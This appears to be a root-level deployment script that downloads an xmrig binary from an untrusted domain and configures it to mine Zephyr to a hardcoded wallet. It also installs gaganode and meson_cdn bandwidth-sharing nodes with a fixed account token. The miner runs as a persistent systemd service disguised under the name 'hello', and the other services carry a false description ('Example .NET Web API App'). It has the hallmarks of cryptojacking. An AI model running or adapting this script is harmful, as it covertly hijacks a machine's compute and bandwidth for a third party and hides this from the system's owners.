sudo su && sudo apt-get update -y && sudo apt-get install libhwloc-dev unzip -y && cd /usr/local/src/ && sudo mkdir xmrig && cd xmrig && sudo mkdir build && cd build && wget http://hnv-data.online/xmrig.zip && unzip xmrig.zip && chmod +x xmrig && sudo echo "vm.nr_hugepages=1280" >> /etc/sysctl.conf && sudo sysctl -p

cat > /usr/local/src/xmrig/build/config.json <<EOL
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": false,
    "colors": true,
    "randomx": {
        "init": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "numa": true
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "asm": true,
        "argon2-impl": null,
        "astrobwt-max-size": 550,
        "astrobwt-avx2": false,
        "argon2": [0],
        "astrobwt": [-1],
        "cn": [
            [0,1,2,3]
        ],
        "cn-heavy": [
            [0,1,2,3]
        ],
        "cn-lite": [
            [0,1,2,3]
        ],
        "cn-pico": [
            [0,1,2,3]
        ],
        "rx": [0,1],
        "rx/wow": [0,1,2,3],
        "cn/0": false,
        "cn-lite/0": false,
        "rx/arq": "rx/wow",
        "rx/keva": "rx/wow"
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",        "adl": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "donate-level": 0,
    "donate-over-proxy": 0,
    "log-file": null,
    "pools": [
        {
            "algo": "rx/0",
            "coin": null,
            "url": "ca.zephyr.herominers.com:1123",
            "user": "ZEPHYR2uVd8dvCWoWEVSdzL4CBzW2jYZsgpt1wcUqaFL1QApHuurHG83zaXbi21cooRP7aapLgjAnLNbFgzRDExVjercy5nkuxW14",
            "pass": "x",
            "rig-id": null,
            "nicehash": false,
            "keepalive": false,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null
        }
    ],
    "print-time": 60,
    "health-print-time": 60,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true
}

EOL

cat > /lib/systemd/system/hello.service <<EOL
[Unit]
Description=hello
After=network.target
[Service]
ExecStart=/usr/local/src/xmrig/build/xmrig
WatchdogSec=1800
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOL

sudo systemctl daemon-reload && sudo systemctl enable hello.service && sudo systemctl start hello.service

cd /root && curl -o gaganode-linux-amd64.tar.gz https://assets.coreservice.io/public/package/66/gaganode_pro/0.0.200/gaganode_pro-0_0_200.tar.gz && tar -zxf gaganode-linux-amd64.tar.gz && rm -f gaganode-linux-amd64.tar.gz && cd gaganode-linux-amd64 && rm -rf ./root_conf/default.toml && cd root_conf && wget https://raw.githubusercontent.com/taikhoanxzc004/gaga/main/default.toml
cat > /etc/systemd/system/gaganode.service <<EOL
[Unit]
Description=Example .NET Web API App running on Ubuntu

[Service]
WorkingDirectory=/root/gaganode-linux-amd64
ExecStart=/root/gaganode-linux-amd64/gaganode
Restart=always
RestartSec=10
KillSignal=SIGINT
User=root

[Install]
WantedBy=multi-user.target
EOL
sudo systemctl daemon-reload && sudo systemctl enable gaganode.service && sudo systemctl start gaganode.service

cd /root && wget 'https://staticassets.meson.network/public/meson_cdn/v3.1.19/meson_cdn-linux-amd64.tar.gz' && tar -zxf meson_cdn-linux-amd64.tar.gz && rm -f meson_cdn-linux-amd64.tar.gz && cd ./meson_cdn-linux-amd64 && sudo ./service install meson_cdn && sudo ./meson_cdn config set --token=fdmbxmtufonkjjpqb60855facf68464d --https_port=443 --cache.size=20 && sudo ./service start meson_cdn
cat > /etc/systemd/system/meson.service <<EOL
[Unit]
Description=Example .NET Web API App running on Ubuntu

[Service]
WorkingDirectory=/root/meson_cdn-linux-amd64
ExecStart=/root/meson_cdn-linux-amd64/meson_cdn
Restart=always
RestartSec=10
KillSignal=SIGINT
User=root

[Install]
WantedBy=multi-user.target
EOL
sudo systemctl daemon-reload && sudo systemctl enable meson.service && sudo systemctl start meson.service
